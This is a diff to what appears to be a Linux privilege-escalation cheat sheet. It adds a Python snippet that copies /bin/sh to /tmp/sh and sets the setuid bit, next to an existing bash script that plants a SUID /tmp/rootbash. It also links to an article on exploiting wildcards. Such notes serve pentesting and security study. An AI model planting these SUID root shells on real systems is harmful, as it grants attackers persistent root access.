@@ -207,6 +207,10 @@ default /usr/bin:/bin
     #!/bin/bash 
     cp /bin/bash /tmp/rootbash 
     chmod +s /tmp/rootbash 
+### RootPython Script    
+
+    import os    
+    os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")    
 ### Wildcards 
 [Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 
 
